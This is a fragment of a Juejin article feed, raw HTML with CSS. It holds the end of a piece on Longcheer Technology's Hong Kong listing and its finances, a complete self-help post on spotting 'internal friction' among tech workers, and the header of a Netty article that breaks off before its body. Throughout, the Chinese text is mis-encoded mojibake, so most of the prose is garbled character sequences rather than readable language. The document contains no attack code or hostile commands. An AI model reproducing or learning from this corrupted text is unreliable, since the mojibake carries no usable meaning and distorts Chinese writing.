<p>è€Œå„äº§å“ä¸­ï¼ŒAIoT åŠå…¶ä»–äº§å“çš„æ¯›åˆ©ç‡æ°´å¹³ç›¸å¯¹æœ€é«˜ï¼Œéšç€è¿™éƒ¨åˆ†ä¸šåŠ¡çš„è¥æ”¶å æ¯”é€æ­¥æ‰©å¤§ï¼Œæœªæ¥é¢„è®¡ä¹Ÿèƒ½è¿›ä¸€æ­¥æ‹‰åŠ¨æ•´ä½“æ¯›åˆ©æ°´å¹³ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/327eaf004b2c42e985a424c660ee0098~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=pS5dFunhXdPzhTteDkQFJj2EZF0%3D" alt="" loading="lazy"/></p>
<p>2022 å¹´~ 2024 å¹´ï¼Œå…¬å¸å‡€åˆ©æ¶¦ä¸º 5.62 äº¿å…ƒã€6.03 äº¿å…ƒå’Œ 4.93 äº¿å…ƒï¼›2025 å¹´å‰ä¸‰å­£åº¦ä¸º 5.14 äº¿å…ƒï¼Œå·²è¶…è¿‡å»å¹´å…¨å¹´æ°´å¹³ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6968ba5975b34291a449c544e8f19ffe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=YCABIIbszNxVgsfxZwsBOzAkyK8%3D" alt="" loading="lazy"/></p>
<p>æ”¯å‡ºå±‚é¢ï¼Œç ”å‘æ˜¯é‡ä¸­ä¹‹é‡ï¼›ç ”å‘å’Œå·¥ç¨‹å›¢é˜Ÿå¤§çº¦ç”± 5200 åä¸“ä¸šäººå‘˜ç»„æˆã€‚</p>
<p>2022 å¹´~ 2024 å¹´ä»¥åŠ 2025 å¹´å‰ä¸‰å­£åº¦ï¼Œå…¬å¸çš„ç ”å‘å¼€æ”¯åˆ†åˆ«ä¸º 15 äº¿å…ƒã€16.9 äº¿å…ƒã€20.8 äº¿å…ƒå’Œ 19.5 äº¿å…ƒï¼›å¯¹åº”åŒæœŸå æ€»æ”¶å…¥çš„æ¯”é‡åˆ†åˆ«ä¸º 5.1%ã€6.2%ã€4.5% å’Œ 6.2%ã€‚</p>
<p>æœ€ååœ¨ç°é‡‘å±‚é¢ï¼Œæˆªè‡³ 2025 å¹´ä¸‰å­£åº¦æœ«ï¼Œå…¬å¸çš„ç°é‡‘åŠç°é‡‘ç­‰ä»·ç‰©ä¸º 68.5 äº¿å…ƒã€‚</p>
<p>æ˜¯è°æ‰“é€ äº†è¿™æ ·ä¸€å®¶ä¸Šæµ·é¾™å¤´ï¼Ÿ</p>
<h2 data-id="heading-3">è°æ‰“é€ äº† ODM å·¨å¤´ï¼Ÿ</h2>
<p>ä¸Šæµ·é¾™æ——ç§‘æŠ€æˆç«‹äº 2004 å¹´ï¼Œå…¬å¸åˆ›å§‹äººã€è‘£äº‹é•¿æ˜¯ä»Šå¹´ 53 å²çš„æœå†›çº¢ã€‚</p>
<p>1990 å¹´ï¼Œæœå†›çº¢è¢«ä¿é€è‡³æµ™æ±Ÿå¤§å­¦æ··åˆç­â€”â€”è¿™ä¸ªç­çº§åªæ‹›æ”¶å…¨å›½é«˜è€ƒçŠ¶å…ƒå’Œä¼˜ç§€å­¦ç”Ÿï¼Œæ˜¯ç«ºå¯æ¡¢å­¦é™¢çš„å‰èº«ã€‚</p>
<p>è¯»å®Œæµ™æ±Ÿå¤§å­¦å·¥ä¸šè‡ªåŠ¨åŒ–æœ¬ç§‘åï¼Œæœå†›çº¢åˆåœ¨ 1999 å¹´æ‹¿åˆ°äº†æµ™æ±Ÿå¤§å­¦ç”µæœºä¸ç”µå™¨åšå£«å­¦ä½ã€‚</p>
<p>æœåšå£«åœ¨æ¶ˆè´¹ç”µå­é¢†åŸŸå·²ç»æœ‰ 20 å¤šå¹´ç»éªŒï¼Œåœ¨åˆ›åŠé¾™æ——ç§‘æŠ€ä¹‹å‰ï¼Œä»–æ›¾æ˜¯<strong>ä¸­å…´é€šè®¯</strong>çš„é«˜ç®¡ï¼Œæ˜¯å½“æ—¶ä¸­å…´é€šè®¯é‡Œé¢æ™‹å‡æœ€å¿«ï¼Œä¹Ÿæ˜¯æœ€å¹´è½»çš„äº§å“æ€»ç»ç†ã€‚</p>
<p>2004 å¹´å‰åï¼Œæœå†›çº¢æ„ŸçŸ¥åˆ°æ¶ˆè´¹ç”µå­è¡Œä¸šå…·å¤‡å·¨å¤§æ½œåŠ›ï¼Œäºæ˜¯å†³å®šå‡ºèµ°åˆ›ä¸šï¼Œå¸¦ç€å‡ ä½ä¸­å…´é€šè®¯çš„è€åŒäº‹ï¼Œä¸€èµ·æ‰“é€ äº†ä¸Šæµ·é¾™æ——ç§‘æŠ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abab0f6255cb4a1885a149ce803d1fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=9%2B0%2F5spxJ%2FmVLGoFrUmdNkwuDqc%3D" alt="" loading="lazy"/></p>
<p>å…¬å¸åˆ›ç«‹ä¹‹åˆï¼Œä¸»è¦ä»¥ IDH æ¨¡å¼ï¼ˆIndependent Design Houseï¼‰èµ·å®¶ï¼Œä¸ºæ‰‹æœºå‚å•†æä¾›å…¨å¥—è®¾è®¡æ–¹æ¡ˆï¼Œä¹‹åé€æ­¥æ‰©å¤§ä¸šåŠ¡èŒƒå›´ï¼Œå‘å±•ä¸ºæ¶ˆè´¹ç”µå­ ODM å·¨å¤´ã€‚</p>
<p>å…¬å¸åœ¨èµ„æœ¬å¸‚åœºè¿ˆå‡ºçš„ç¬¬ä¸€æ­¥ï¼Œå®é™…æ˜¯åœ¨æˆç«‹æ¬¡å¹´ï¼Œä¹Ÿå°±æ˜¯ 2005 å¹´ã€‚</p>
<p>å½¼æ—¶ï¼Œé¾™æ——é€šè¿‡é—´æ¥æŒæœ‰å…¬å¸ 100% è‚¡æƒçš„ç¦»å²¸æŠ•èµ„æ§è‚¡å®ä½“ï¼Œå®ç°äº†åœ¨æ–°åŠ å¡è¯åˆ¸äº¤æ˜“æ‰€ä¸Šå¸‚ã€‚</p>
<p>ä¸è¿‡ï¼Œç”±äºå¸‚åœºè§„æ¨¡æœ‰é™ï¼Œå¯¹å…¬å¸å¸å¼•å¤–éƒ¨èµ„é‡‘ã€æ”¯æŒç ”å‘å’Œæ‰©å¼ çš„å¸®åŠ©ä¸å¦‚å›½å†… A è‚¡å¸‚åœºï¼Œé¾™æ——å†³å®šåœ¨ 2020 å¹´ä»æ–°äº¤æ‰€é€€å¸‚ï¼Œè½¬æˆ˜ A è‚¡ã€‚</p>
<p>2024 å¹´ 3 æœˆï¼Œé¾™æ——åœ¨ä¸Šæµ·è¯åˆ¸äº¤æ˜“æ‰€æˆåŠŸä¸Šå¸‚ï¼Œå½“æ—¥å¼€ç›˜ä»·ä¸º 59.99 å…ƒ / è‚¡ï¼Œè¾ƒå‘è¡Œä»·æš´æ¶¨ 131%ï¼›æ”¶ç›˜ä»·ä¸º 51.92 å…ƒ / è‚¡ï¼Œè¾ƒå‘è¡Œä»·ä»æš´æ¶¨ 99.69%ã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œå…¬å¸æˆç«‹åŒå¹´ï¼Œé¾™æ——å°±æ‹¿åˆ°äº† IDG èµ„æœ¬å’Œæ‹›å•†å±€èµ„æœ¬çš„å¤©ä½¿è½®èèµ„ã€‚</p>
<p>å°ç±³ç§‘æŠ€ã€é›·å†›çš„é¡ºä¸ºèµ„æœ¬ã€åŸºçŸ³èµ„æœ¬ï¼Œåˆ™å‚ä¸äº†é¾™æ——çš„ A è½®èèµ„ã€‚æ‰€ä»¥å°ç±³ä¸ä»…æ˜¯é¾™æ——çš„æœ€å¤§å®¢æˆ·ï¼Œè¿˜æ˜¯é‡è¦æŠ•èµ„è€…ï¼Œç›®å‰å‰è€…æŒæœ‰åè€… 4.94% çš„è‚¡ä»½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10c44c52a7f246ca944932dacfd2575d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=xB50Ek91aUsCD6G0HNBm1u30hoA%3D" alt="" loading="lazy"/></p>
<p>å¦‚ä»Šï¼Œé¾™æ——æˆåŠŸèµ´æ¸¯ä¸Šå¸‚ï¼Œæ¸¯è‚¡ â€œæ¶ˆè´¹ç”µå­ ODM ç¬¬ä¸€è‚¡â€ ä¹Ÿè½åœ°äº†ã€‚</p>
<p><em>æ‹›è‚¡ä¹¦ä¼ é€é—¨ï¼š</em><br/>
<em><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww1.hkexnews.hk%2Fapp%2Fsehk%2F2025%2F108011%2Fdocuments%2Fsehk25123001114_c.pdf" target="_blank" title="https://www1.hkexnews.hk/app/sehk/2025/108011/documents/sehk25123001114_c.pdf" ref="nofollow noopener noreferrer">www1.hkexnews.hk/app/sehk/20â€¦</a></em></p>
<p><strong>æ¬¢è¿åœ¨è¯„è®ºåŒºç•™ä¸‹ä½ çš„æƒ³æ³•ï¼</strong></p>
<p>â€”Â <strong>å®Œ</strong>Â â€”</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨AIæ—¶ä»£ä¸‹ï¼ŒæŠ€æœ¯äººè¦æ‹¥æœ‰å†…è€—è¯†åˆ«ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7597776334065041460</link>    <guid>https://juejin.cn/post/7597776334065041460</guid>    <pubDate>2026-01-22T06:21:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597776334065041460" data-draft-id="7597779410405916706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨AIæ—¶ä»£ä¸‹ï¼ŒæŠ€æœ¯äººè¦æ‹¥æœ‰å†…è€—è¯†åˆ«ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,ç¨‹åºå‘˜,äº§å“"/> <meta itemprop="datePublished" content="2026-01-22T06:21:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é…’æ˜Ÿå°æœ"/> <meta itemprop="url" content="https://juejin.cn/user/1512542215093479"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨AIæ—¶ä»£ä¸‹ï¼ŒæŠ€æœ¯äººè¦æ‹¥æœ‰å†…è€—è¯†åˆ«ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1512542215093479/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é…’æ˜Ÿå°æœ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:21:38.000Z" title="Thu Jan 22 2026 06:21:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{font-family:PingFang SC,Microsoft YaHei,sans-serif;word-break:break-word;font-size:16px;overflow-x:hidden}.markdown-body li,.markdown-body p{font-size:.9em;letter-spacing:2px;color:#333}.markdown-body li code,.markdown-body p code{font-family:PingFang SC,Microsoft YaHei,sans-serif;font-weight:500;background:rgba(119,175,156,.22);border-radius:0;padding:2px 5px;border-left:2px solid #77af9c;color:#6e7783}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{display:table;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1,.markdown-body h2,.markdown-body h3{background:rgba(119,175,156,.22);color:#6e7783;padding:5px 10px;border:1px solid rgba(119,175,156,.22);transition:all .5s}.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover{border:1px solid #77af9c}.markdown-body h1{font-size:1.6em}.markdown-body h2{font-size:1.4em}.markdown-body h3{font-size:1.1em}.markdown-body h4,.markdown-body h5,.markdown-body h6{text-align:center}.markdown-body h4:after,.markdown-body h5:after,.markdown-body h6:after{content:"/";color:#77af9c;font-weight:400;margin-left:15px}.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"/";color:#77af9c;font-weight:400;margin-right:15px}.markdown-body h4,.markdown-body h5,.markdown-body h6{display:block;color:#77af9c;font-size:400;font-weight:400}.markdown-body hr{margin-top:20px;margin-bottom:20px;border:none;border-top:2px solid #77af9c}.markdown-body blockquote{position:relative;line-height:1.8;font-style:400;text-indent:0;margin:0;padding:10px;border:1px solid #fff;color:#888;background:rgba(119,175,156,.22);transition:border .5s}.markdown-body blockquote:hover{border-style:solid;border-color:#77af9c}.markdown-body blockquote:before{content:"â€œ";display:inline;color:#6e7783;font-size:4em;font-family:Arial,serif;line-height:1em}.markdown-body blockquote:after{position:absolute;content:"Tips";display:inline;bottom:5px;right:15px;color:#6e7783;font-size:.9em}.markdown-body blockquote p{display:inline}.markdown-body table{border-collapse:collapse;width:auto;min-width:50%;font-size:.8em}.markdown-body table tr th{text-align:center;border:1px solid #77af9c;background:rgba(119,175,156,.22);font-weight:500;padding:5px}.markdown-body table tr td{text-align:center;border:1px solid rgba(119,175,156,.22);padding:5px}.markdown-body pre{font-family:Arial,serif;overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-family:Arial,serif;border-left:2px solid #77af9c;display:block;padding:16px 12px;margin:0;font-size:.9em;color:#6e7783;word-break:normal;overflow-x:auto;background:#f8f8f8}.markdown-body a{color:#77af9c;font-weight:400;background:#fff;border-bottom:none;padding:2px 5px;text-decoration:none;transition:all .5s}.markdown-body a:hover{background:rgba(119,175,156,.22);color:#6e7783}.markdown-body strong{font-weight:700;color:#6e7783}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å†…è€—è¯†åˆ«ç³»ç»Ÿï¼ˆå½“åœºå¯ç”¨ï¼‰</h2>
<p>å†…è€—æœ€å±é™©çš„åœ°æ–¹åœ¨äºï¼š<strong>å®ƒçœ‹èµ·æ¥åƒåˆç†çš„æ€è€ƒã€‚</strong></p>
<p>æ‰€ä»¥ä½ æœ€éœ€è¦çš„ä¸æ˜¯åçœï¼Œè€Œæ˜¯<strong>ä¸€ä¸ªå³æ—¶è¯†åˆ«è£…ç½®ã€‚</strong></p>
<h3 data-id="heading-1">å†…è€—è‡ªæ£€ä¸‰é—®</h3>
<p>æ¯å¤©åªé—®ä»¥ä¸‹ä¸‰ä¸ªé—®é¢˜ã€‚</p>
<p>ä¸åˆ†æï¼Œä¸è§£é‡Šï¼Œåªçœ‹ç­”æ¡ˆã€‚</p>
<p>1ï¸âƒ£ æˆ‘ç°åœ¨åœ¨åšçš„äº‹ï¼Œä»Šå¤©èƒ½ Ship å—ï¼Ÿ</p>
<p>ä¸èƒ½ -&gt; é«˜é£é™©å†…è€—</p>
<p>èƒ½ï¼Œä½†æˆ‘åœ¨å›é¿ -&gt; å·²å‘ç”Ÿå†…è€—</p>
<p>2ï¸âƒ£ å¦‚æœä¸å®Œç¾ï¼Œæˆ‘è¿˜ä¼šç»§ç»­å—ï¼Ÿ</p>
<p>ä¸ä¼š -&gt; è‡ªå°Šæ¥å…¥</p>
<p>ä¼š -&gt; æ„å»ºè¡Œä¸º</p>
<p>3ï¸âƒ£ è¿™ä¸ªåŠ¨ä½œæ˜¯åœ¨æ„å»ºï¼Œè¿˜æ˜¯åœ¨ä¿æŠ¤è‡ªå°Šï¼Ÿ</p>
<p>è¿™æ˜¯æœ€é‡è¦çš„é—®é¢˜ï¼Œå¦‚æœä½ çŠ¹è±«äº†ï¼Œç­”æ¡ˆé€šå¸¸å·²ç»å¾ˆæ˜æ˜¾äº†ã€‚</p>
<hr/>
<h3 data-id="heading-2">â€œä¿æŠ¤è‡ªå°Šâ€ä¿¡å·æ¸…å•</h3>
<p>ä»¥ä¸‹ä¿¡å·ä¸€æ—¦å‡ºç°ï¼Œè¯´æ˜<strong>ä½ å·²ç»ä¸åœ¨æ„å»ºç³»ç»Ÿé‡Œã€‚</strong></p>
<p>å…¸å‹è¡¨ç°åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>æˆ‘å†å­¦ä¸€ä¸ªç›¸å…³æŠ€æœ¯å†å¼€å§‹</p>
</li>
<li>
<p>ç­‰åˆ«äººç»™ç‚¹åé¦ˆå†è¯´</p>
</li>
<li>
<p>è¿™ä¸ªç»“æ„ä¸å¤ªå¯¹ï¼Œå…ˆä¼˜åŒ–ä¸€ä¸‹</p>
</li>
<li>
<p>å…ˆæŠŠæ–‡æ¡£å†™å®Œæ•´ä¸€ç‚¹</p>
</li>
<li>
<p>è¿™ä¸ªç‰ˆæœ¬æœ‰ç‚¹æ‹¿ä¸å‡ºæ‰‹</p>
</li>
</ul>
<p><strong>ğŸ’¡ å¿…é¡»æé†’ï¼šä¸€æ—¦ä½ åœ¨ä¿æŠ¤è‡ªå°Šï¼Œç³»ç»Ÿå·²ç»å¤±æ•ˆäº†ã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">å†…è€—æ­¢æŸæœºåˆ¶ï¼ˆå…³é”®æ‰§è¡Œï¼‰</h2>
<p>è¿™ä¸€èŠ‚æ˜¯<strong>åç›´è§‰çš„ã€‚</strong></p>
<h3 data-id="heading-4">å†…è€—å‡ºç°æ—¶ï¼Œä½ ä¸èƒ½â€œæƒ³æ˜ç™½â€</h3>
<p>ä½ å¯èƒ½ä¼šæœ¬èƒ½åœ°æƒ³ï¼š</p>
<ul>
<li>å†æƒ³æ¸…æ¥šä¸€ç‚¹</li>
<li>å†ç†ä¸€ç†é€»è¾‘</li>
<li>å†ç­‰ç­‰çŠ¶æ€</li>
</ul>
<p>è¿™æ˜¯<strong>å†…è€—æœ€æ“…é•¿çš„è¯±å¯¼ã€‚</strong></p>
<p><strong>å¿…é¡»è®°ä½ï¼š</strong></p>
<blockquote>
<p><strong>å†…è€—ï¼Œæ— æ³•é æ€è€ƒè§£å†³ï¼Œåªèƒ½é è¡ŒåŠ¨ä¸­æ–­ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-5">ä¸‰æ­¥æ­¢æŸæ³•ï¼ˆå¯æ‰§è¡Œï¼‰</h3>
<p>ä¸éœ€è¦å·¥å…·ï¼Œä¸éœ€è¦ç¯å¢ƒï¼Œä¸éœ€è¦çŠ¶æ€ã€‚</p>
<p><strong>Step 1ï¼šå‘½åï¼ˆ30ç§’ï¼‰</strong></p>
<p>ç›´æ¥è¯´å‡ºæ¥ï¼š <strong>â€œæˆ‘ç°åœ¨æ˜¯åœ¨ ___ å‹å†…è€—ä¸­â€ã€‚</strong></p>
<p>è®¤çŸ¥å‹ã€ç¤¾äº¤å‹ã€æƒ…ç»ªå‹ã€‚</p>
<p>å‘½åçš„ä½œç”¨åªæœ‰ä¸€ä¸ªï¼š<strong>æŠŠä½ ä»â€œæˆ‘å°±æ˜¯è¿™æ ·â€ä¸­æ‹‰å‡ºæ¥ã€‚</strong></p>
<p><strong>Step 2ï¼šç¼©å°ï¼ˆ1åˆ†é’Ÿï¼‰</strong></p>
<p>ç«‹åˆ»æŠŠä»»åŠ¡ç¼©åˆ°ï¼š<strong>10åˆ†é’Ÿå†…å¿…é¡»èƒ½å®Œæˆçš„ç‰ˆæœ¬ã€‚</strong></p>
<p>ä¸æ˜¯æ¨è¿›é¡¹ç›®ï¼Œè€Œæ˜¯æ¨è¿›<strong>ä¸€ä¸ªåŠ¨ä½œã€‚</strong></p>
<p>ä¾‹å¦‚ï¼šå†™ä¸€å¥æè¿°ã€æ”¹ä¸€ä¸ªå­—æ®µã€æˆªä¸€å¼ å›¾ã€‚</p>
<p><strong>Step 3ï¼šå¼ºåˆ¶ Shipï¼ˆä¸è®²é“ç†ï¼‰</strong></p>
<p>å“ªæ€•æ˜¯ä¸€å¥è¯ã€ä¸€ä¸ªæˆªå›¾ã€ä¸€ä¸ªå¸–å­ã€‚</p>
<p>åŸåˆ™åªæœ‰ä¸€ä¸ªï¼š<strong>å¿…é¡»è¢«çœ‹è§ã€‚</strong></p>
<hr/>
<h3 data-id="heading-6">ä¸ºä»€ä¹ˆâ€œå¼ºåˆ¶ Shipâ€æœ‰æ•ˆï¼Ÿ</h3>
<p>å› ä¸º Ship åšäº†ä¸‰ä»¶äº‹è¯·ï¼š</p>
<p>1ï¸âƒ£ ç»“æŸçŠ¹è±«</p>
<p>2ï¸âƒ£ å®Œæˆé—­ç¯</p>
<p>3ï¸âƒ£ æŠŠæ³¨æ„åŠ›æ‹‰å›ç°å®</p>
<p>ğŸ“Œ æ ¸å¿ƒï¼ˆè¯·è®°ä½ï¼‰ï¼š<strong>æƒ…ç»ªè·Ÿéšè¡ŒåŠ¨ï¼Œä¸æ˜¯åè¿‡æ¥ï¼Œä½ ä¸éœ€è¦å¥½çŠ¶æ€ï¼Œä½ åªéœ€è¦å®Œæˆä¸€ä¸ªåŠ¨ä½œã€‚</strong></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å½»åº•ææ‡‚Nettyé«˜æ€§èƒ½ä¹‹é“ï¼šReactoræ¨¡å‹ä¸é›¶æ‹·è´æŠ€æœ¯åœ¨ç”Ÿäº§ç¯å¢ƒçš„æ·±åº¦åº”ç”¨]]></title>    <link>https://juejin.cn/post/7597701762904997934</link>    <guid>https://juejin.cn/post/7597701762904997934</guid>    <pubDate>2026-01-22T06:17:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597701762904997934" data-draft-id="7597989474971828274" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½»åº•ææ‡‚Nettyé«˜æ€§èƒ½ä¹‹é“ï¼šReactoræ¨¡å‹ä¸é›¶æ‹·è´æŠ€æœ¯åœ¨ç”Ÿäº§ç¯å¢ƒçš„æ·±åº¦åº”ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-22T06:17:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡å°æ±¤åœ†"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½»åº•ææ‡‚Nettyé«˜æ€§èƒ½ä¹‹é“ï¼šReactoræ¨¡å‹ä¸é›¶æ‹·è´æŠ€æœ¯åœ¨ç”Ÿäº§ç¯å¢ƒçš„æ·±åº¦åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡å°æ±¤åœ†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:17:15.000Z" title="Thu Jan 22 2026 06:17:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
